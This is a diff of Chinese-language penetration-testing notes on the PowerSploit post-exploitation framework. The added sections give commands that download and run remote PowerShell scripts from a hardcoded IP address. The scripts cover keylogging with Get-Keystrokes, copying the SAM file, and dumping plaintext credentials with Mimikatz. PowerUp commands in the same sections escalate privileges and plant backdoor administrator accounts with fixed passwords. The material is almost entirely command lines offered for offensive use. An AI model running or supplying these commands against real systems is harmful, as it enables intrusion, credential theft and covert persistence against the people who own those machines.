@@ -4602,7 +4602,7 @@ PowerShell脚本在默认情况下无法直接执行，这时就可以用上面�
 
 
 
-### PowerSploit
+### PowerSploit工具
 
 PowerSploit是一款基于PowerShell的后渗透（Post-Exploitation）框架软件，包含很多PowerShell攻击脚本，它们主要用于渗透中的信息侦察，权限提升，权限维持等。
 
@@ -4734,7 +4734,7 @@ Invoke-DllInjection -Dll .\code.dll -ProcessID 3552
 通过IEX下载并调用invoke-portscan
 
 ```
-IEX(New-Object Net.WebClient net.webclient).DownloadString("http://47.111.139.22:2333/PowerSploit/Recon/Invoke-Portscan.ps1")
+IEX(New-Object Net.WebClient).DownloadString("http://47.111.139.22:2333/PowerSploit/Recon/Invoke-Portscan.ps1")
 ```
 
 PowerShell执行
@@ -4752,7 +4752,7 @@ Invoke-Portscan -Hosts 192.168.52.143 -Ports "1-65535"
 通过IEX下载并调用Get-HttpStatus
 
 ```
-IEX(New-Object Net.WebClient net.webclient).DownloadString("http://47.111.139.22:2333/PowerSploit/Recon/Get-HttpStatus.ps1")
+IEX(New-Object Net.WebClient).DownloadString("http://47.111.139.22:2333/PowerSploit/Recon/Get-HttpStatus.ps1")
 ```
 
 PowerShell执行
@@ -4770,7 +4770,7 @@ Get-HttpStatus -Target 192.168.52.141 -Path C:\Users\Adminnistrator\Desktop\gene
 通过IEX下载并调用Invoke-ReverseDnsLookup
 
 ```
-IEX(New-Object Net.WebClient net.webclient).DownloadString("http://47.111.139.22:2333/PowerSploit/Recon/Invoke-ReverseDnsLookup.ps1")
+IEX(New-Object Net.WebClient).DownloadString("http://47.111.139.22:2333/PowerSploit/Recon/Invoke-ReverseDnsLookup.ps1")
 ```
 
 PowerShell执行
@@ -4781,7 +4781,292 @@ Invoke-ReverseDnsLookup '192.168.52.141'
 
 
 
-d) 调用Invoke-ReverseDnsLookup扫描内网主机的ip对应的主机名
+#### Exfiltration模块
+
+##### a) 调用Get-Keystrokes记录用户的键盘输入
+
+Get-Keystrokes是Exfiltration模块下的个脚本，不仅能用于键盘记录，甚至能记录鼠标的点击情况，还能记录详细时间，可以直接放入后台运行。
+
+通过IEX下载并调用Get-Keystrokes
+
+```
+IEX(New-Object Net.WebClient).DownloadString("http://47.111.139.22:2333/PowerSploit/Exfiltration/Get-Keystrokes.ps1")
+```
+
+PowerShell执行，需要指定一个保存路径
+
+```
+Get-Keystrokes -LogPath C:\Users\Administrator\Desktop\keys.txt
+```
+
+![image-20210325150945551](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210325150945551.png)
+
+
+
+##### b) 调用Invoke-NinjaCopy复制一些系统无法复制的文件如sam文件
+
+通过IEX下载并调用Get-NinjaCopy
+
+正常情况下复制：
+
+![fuzhi  1.png](images/Web%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2.assets/15264572186562.png!small)
+
+通过Invoke-NinjaCopy进行复制
+
+```
+IEX(New-Object Net.WebClient).DownloadString("http://47.111.139.22:2333/PowerSploit/Exfiltration/Invoke-NinjaCopy.ps1")
+
+Invoke-NinjaCopy -Path C:\Users\Administrator\SAM -LocalDestination C:\Users\Administrator\Desktop\xxx
+```
+
+
+
+##### c) 调用Invoke-Mimikatz（内网神器）抓取内存中的明文密码
+
+```
+IEX(New-Object Net.WebClient).DownloadString("http://47.111.139.22:2333/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1")
+
+Invoke-Mimikatz -DumpCreds
+```
+
+![image-20210325151836349](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210325151836349.png)
+
+**注意：这个脚本是要有管理员权限下才可以正常执行，否则会报错，毕竟涉及到密码之类的敏感信息，哪怕是管理员想看到明文的，也是很难实现的**
+
+
+
+#### PowerUp攻击模块
+
+PowerUp是Privesc模块下的脚本，拥有众多用来寻找目标主机Windows服务漏洞进行提权的实用脚本。
+
+在无法通过内核漏洞进行提权的时候，我们可以利用这个模块寻找服务器的脆弱点进行提权！
+
+**加载PowerUp脚本模块**
+
+```
+IEX(New-Object Net.WebClient).DownloadString("http://47.111.139.22:2333/PowerSploit/Privesc/PowerUp.ps1")
+
+Import-Module ./PowerUp.ps1		//本地加载
+```
+
+**查看模块的详细说明**
+
+```
+get-Help Invoke-AllChecks -full
+```
+
+
+
+##### 常用命令
+
+- **检查目标主机漏洞**
+
+  自动执行Powerup下所有的脚本，来检查目标主机
+
+  ```
+  Invoke-AllChecks | Format-List
+  ```
+
+- **检查可写入目录**
+
+  该模块用于检查当前%PATH%的哪些目录是用户可以写入的，输入以下命令即可执行该模块
+
+  ```
+  Find-PathDLLHijack
+  ```
+
+- **恢复加密的密码** x
+
+  该模块可以利用系统上的applicationHost.config文件恢复加密过的应用池和虚拟目录的密码
+
+  ```
+  get-ApplicationHost
+  get-ApplicationHost | Format-Table -Autosize #列表显示
+  ```
+
+- **检查AlwaysInstallElevated注册表项是否被设置**
+
+  ```
+  Get-RegistryAlwaysInstallElevated
+  ```
+
+- **查询默认的用户名和密码**
+
+  该模块用于检测Winlogin注册表的AutoAdminLogon项有没有被设置，可查询默认的用户名和密码
+
+  ```
+  Get-RegistryAutoLogon
+  ```
+
+- **返回某服务的信息**
+
+  例如查询Dhcp服务的详细信息
+
+  ```
+  Get-ServiceDetail -ServiceName Dhcp
+  ```
+
+- **检查当前用户写入权限进行提权** x
+
+  该模块用于检查当前用户能够在哪些服务的目录写入相关联的可执行文件，我们可以通过这些文件实现提权
+
+  ```
+  Get-ServiceFilePermission
+  ```
+
+- **检查所有可用的服务，并尝试进行修改**
+
+  该模块用于检查所有可用的服务，并尝试对这些打开的服务进行修改，如果可以修改，则返回该服务对象
+
+  ```
+  Test-ServiceDaclPermission
+  ```
+
+- **检查服务路径，利用逻辑漏洞提权** x
+
+  该模块用于检查服务路径，返回包含空格但是不带引号的服务路径
+
+  此处利用Windows的一个逻辑漏洞，即当文件包含空格时，Windows API会被解释为两个路径，并将这两个文件同时执行，有时可能会造成权限的提升，比如C:\program files\hello.exe会被解释为C:\program.exe和C:\program files\hello.exe
+
+  ```
+  Get-ServiceUnquoted
+  ```
+
+- **检查系统的部署凭据** x
+
+  该模块用于检查以下路径，查询是否存在这些文件，因为这些文件里可能含有部署凭据，这些文件包含：
+
+  > c:\sysprep\sysprep.xml
+  > c:\sysprep\sysprep.inf
+  > c:\sysprep.inf
+  > c:\windows\Panther\Unattended.xml
+  > c:\windows\Panther\Unattend\Unattended.xml
+  > c:\windows\Panther\Unattend.xml
+  > c:\windows\Panther\Unattend\Unattend.xml
+  > c:\windows\System32\Sysprep\unattend.xml
+  > c:\windows\System32\Sysprep\Panther\unattend.xml
+
+  ```
+  Get-UnattendedInstallFile
+  ```
+
+- **检查开机自启程序的路径和注册表键值**
+
+  该模块用于检查开机自启的应用程序路径和注册表键值，然后返回当前用户可修改的程序路径，被检查的注册表键值有以下这些：
+
+  > HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+  > HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
+  > HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
+  > HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
+  > HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunService
+  > HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceService
+  > HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunService
+  > HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceService
+
+  ```
+  Get-ModifiableRegistryAutoRun
+  ```
+
+- **返回当前用户能够修改的计划任务程序的名称和路径**
+
+  ```
+  Get-ModifiableScheduledTaskFile
+  ```
+
+- **返回当前服务器上web.config文件中的数据库连接字符串的明文**
+
+  ```
+  get-webconfig
+  ```
+
+- **修改服务来添加用户到指定组**
+
+  该模块通过修改服务来添加用户到指定组，并可以通过设置-cmd参数触发添加用户的自定义命令
+
+  ```
+  Invoke-ServiceAbuse -ServiceName VulnSVC #添加默认账号
+  Invoke-ServiceAbuse -ServiceName VulnSVC -UserName “TESTLAB\john” #指定添加的域账号
+  Invoke-ServiceAbuse -ServiceName VulnSVC -UserName backdoor -Password password -LocalGroup “Administrators” #指定添加用户，用户密码以及添加的用户组
+  Invoke-ServiceAbuse -ServiceName VulnSVC -Command “net …” #自定义执行命令
+  ```
+
+- **恢复服务的可执行文件到原始目录**
+
+  ```
+  Restore-ServiceBinary -ServiceName VulnSVC
+  ```
+
+- **检查某个用户是否在服务中有自由访问控制的权限，结果会返回true或false**
+
+  ```
+  Restore-ServiceDaclPermission -ServiceName VulnSVC
+  ```
+
+- **输出一个自定义命令并且能够自我删除的.bat文件**
+
+  该模块用于输出一个自定义命令并且能够自我删除的.bat文件到$env:Temp\debug.bat，并输出一个能够启动这个bat文件的DLL
+
+  
+
+- **生成一个安装文件用于添加用户**
+
+  该模块用于生成一个安装文件，运行这个安装文件后会弹出添加用户的对话框
+
+  ```
+  Write-UserAddMSI
+  ```
+
+- **用于预编译C#服务的可执行文件**
+
+  该模块用于预编译C#服务的可执行文件，默认创建一个管理员账号，可通过command定制自己的命令
+
+  ```
+  Write-ServiceBinary -ServiceName VulnSVC #添加默认账号
+  Write-ServiceBinary -ServiceName VulnSVC -UserName "TESTLAB\john" #指定添加的域账号
+  Write-ServiceBinary -ServiceName VulnSVC -UserName backdoor -Password password123! -LocalGroup "Administrators" #指定添加用户，用户密码以及添加的用户组
+  Write-ServiceBinary -ServiceName VulnSVC -Command "net......" #自定义执行命令
+  ```
+
+- **写一个C#的服务用来添加用户**
+
+  该模块通过Write-ServiceBinary写一个C#的服务用来添加用户
+
+  ```
+  Install-ServiceBinary -ServiceName DHCP
+  Install-ServiceBinary -ServiceName VulnSVC -UserName "TESTLAB\john"
+  Install-ServiceBinary -ServiceName VulnSVC -UserName backdoor -Password password123! 
+  Install-ServiceBinary -ServiceName VulnSVC -Command "net......"
+  ```
+
+- **检查计算机上的管理员用户**
+
+  ```
+  net localgroup administrators
+  ```
+
+- **写入一个管理员用户**
+
+  创建名为“ Common.exe”的可执行文件，该可执行文件会将密码为“p4ssword123”的新用户“ badmin”添加到管理员组。
+
+  ```
+  Write-ServiceBinary -Name 'unquotedsvc' -Path 'C:\Users\Administrator\Desktop\Common.exe' -Username badmin -Password p4ssw0rd123 -Verbose
+  
+  Invoke-ServiceAbuse -Name 'AbyssWebServer' -User hacker -Password Password1337
+  ```
+
+  
+
+- 
+
+
+
+
+
+
+
+
+
+
 
 
 
